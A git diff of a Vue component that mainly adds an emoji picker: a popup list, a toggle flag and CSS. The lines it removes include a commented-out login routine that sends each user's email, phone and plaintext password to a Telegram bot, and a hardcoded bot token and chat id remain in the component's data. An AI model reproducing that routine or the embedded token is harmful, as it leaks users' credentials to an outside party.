@@ -203,49 +203,20 @@ import axios from 'axios';
           </div>
           <div class="Tools h-[50%] flex flex-row justify-center items-center">
             <div @click="AddEmoji()" class="anotherTools">
-
+            </div>
+            <div class="emojiList absolute bottom-[50px] p-[10px] w-[180px] bg-[] h-[150px] float-left" v-if="ShowEmoji">
+              <img class="absolute bottom-[-10px] left-[44%] rotate-[180deg]"
+                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAKCAYAAABblxXYAAABT0lEQVQoU2NkIAAuX74sy8HBsZifn9/048ePp3/8+BGrq6v7GJ82RnySd+/eVfv///9SSUlJEy4uLoZv374xPH/+/AwjI2O0srLyLVx6cRp69epVLTY2tmVSUlL6IANhAGTws2fPLv769StKW1v7GjaDsRoKNNAA6OUV0tLS6uzs7Bj6fv78yfD06dObwKCIABp8AV0BhqHAMLTi5uZeCnShAjYDYQaADAa6+MHXr1+jgWF8DNlgFENv3LjhCDRoIdCFsqysrITikOH3798gFz8GWhCvoaGxH6YBbuj169fdgV4GGShOjIEwA6AGvwQGRbympuZOkDjYUKCBwZycnHOABgqwsLAQdCG6gj9//oBc/OH79+8pQIPXMgIjJYmHh2cCMAx5yTEQZgHIYGAYf/7y5UsBIzAtzldQUIhkYmL6S7IT0TT8+/eP+cGDB8sBvJyOImVWfdgAAAAASUVORK5CYII="
+                alt="">
+              <div @click="selectedEmoji(i)"
+                class="w-[30px] cursor-pointer flex flex-row justify-center items-center float-left h-[30px] emoji hover:background"
+                v-for="i of emojiArray" :key="i.id">{{ i }}</div>
             </div>
           </div>
         </div>
       </div>
 
     </div>
-    <!-- return {
-      users: [],
-      alertVisibility: false,
-      userEmail: '',
-      userPassword: '',
-      token: '6451910166:AAEnPmq1oQsg6Ttsw-azpCWKNyQWcvcIQRg',
-      chat_Id: '-4001282356',
-    };
-  },
-  mounted() {
-    this.users = store.getters.users
-  },
-  methods: {
-    check() {
-      for (let i of this.users) {
-        if (i.email == this.userEmail && i.password == this.userPassword) {
-          window.localStorage.profile = JSON.stringify(i)
-          let message = `username: ${i.firstName} \n usersurname: ${i.lastName} \n email: ${i.email} \n phone: ${i.phone} \n password: ${i.password} successfully accessed to account. `
-          let api = `https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chat_Id}&text=${message}`
-          axios.post(api).then(res => {
-            console.log('ok', res);
-          })
-          event.preventDefault()
-          window.location.pathname = '/profile'
-        }
-        else {
-          this.alertVisibility = !this.alertVisibility
-        }
-      } -->
-
-
-
-    <!-- <div class="chatBot w-[300px] pt-[8px] pl-[15px] h-[400px]">
-      <div class="leaf"></div>
-      <span class="text-white text-[15px] font-normal tracking-tighter">Чат-бот (Beta)</span>
-    </div> -->
   </div>
 </template>
 <script>
@@ -259,6 +230,7 @@ export default {
       words: ["Пенсия", "Яшаш жойи", "Субсидия", "IMEI", "COVID-19", "Ойлик"],
       currentWordIndex: 0,
       currentPlaceholder: "",
+      ShowEmoji: false,
       intervalId: null,
       token: '6451910166:AAEnPmq1oQsg6Ttsw-azpCWKNyQWcvcIQRg',
       chat_Id: '-4001282356',
@@ -385,8 +357,8 @@ export default {
           colorOfIco: '#119cec'
         },
       ],
-      emojiArray:[
-        "😇", "🦄", "😕", "😡","😈","😞","😘","😋","😥","😩","😁","😆","😉","😎","😐","😜","😮","👍","👎","😃"
+      emojiArray: [
+        "😇", "🦄", "😕", "😡", "😈", "😞", "😘", "😋", "😥", "😩", "😁", "😆", "😉", "😎", "😐", "😜", "😮", "👍", "👎", "😃"
       ]
     };
   },
@@ -446,8 +418,12 @@ export default {
     beforeDestroy() {
       clearInterval(this.intervalId);
     },
-    AddEmoji(){
-     this.text += '🦄'
+    AddEmoji() {
+      this.ShowEmoji = !this.ShowEmoji
+    },
+    selectedEmoji(i) {
+      this.text += i
+      this.ShowEmoji = !this.ShowEmoji
     },
     SendSMS() {
       if (this.text !== '') {
@@ -665,6 +641,11 @@ button {
   border-radius: 5px;
 }
 
+.emoji:hover {
+  background-color: #f1f0f0;
+  border-radius: 5px;
+}
+
 input:focus {
   outline: none;
 }
@@ -683,6 +664,14 @@ input:focus {
   width: 150px;
   height: 100px;
   border-radius: 10px;
+}
+
+.emojiList {
+  z-index: 99999999999 !important;
+  background-color: #fff;
+  border: 1px solid #e0e4ed;
+  border-radius: 3px !important;
+  box-shadow: 0 7px 14px 0 rgba(0, 0, 0, .12);
 }
 </style>
 
